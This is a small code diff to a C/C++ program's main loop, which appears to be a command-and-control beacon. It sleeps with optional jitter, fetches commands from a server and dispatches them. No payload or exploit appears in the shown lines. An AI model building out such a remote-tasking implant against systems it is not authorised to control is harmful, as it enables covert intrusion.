@@ -10,6 +10,12 @@ PAuthConfig AuthConf      = NULL;
 PServerConfig ServerConf  = NULL;
 PCOMMANDINFO CommandInfo = NULL;
 
+
+
+/*
+	TODO re write all this after handling binary format, config etc
+*/
+
 int main(void) {
 	
 	
@@ -31,8 +37,9 @@ int main(void) {
 		return 1;
 	}
 	
+	Commands cmds;
 	
-	
+	// change
 	char CommandBuf[1024];
 	while (TRUE) {
 		Sleep(3000);
@@ -44,18 +51,19 @@ int main(void) {
 		int randJitter = (rand() % (2 * JitterRange + 1)) - JitterRange;
 		int finalTime = ServerConf->SleepTime + randJitter;
 		*/
-		
-		if (!g_NetworkManager->GetCommand(CommandBuf, sizeof(CommandBuf))) {
+		INT SizeOfData;
+		if (!g_NetworkManager->GetCommand(CommandBuf, sizeof(CommandBuf), &SizeOfData)) {
 			printf("network fail\n");
 			continue;
 		}
 
 
-		if (!ParseCommand((BYTE*)CommandBuf)) {
+		/*if (!ParseCommand((BYTE*)CommandBuf, SizeOfData)) {
 			printf("COmmand Fail\n");
 			continue;
-		}
+		}*/
 
+		cmds.Dispatch((BYTE*)CommandBuf, SizeOfData);
 
 		//cmds.Dispatch(CommandInfo->commandCode, CommandInfo->commandID, CommandInfo->param, CommandInfo->param2);
 
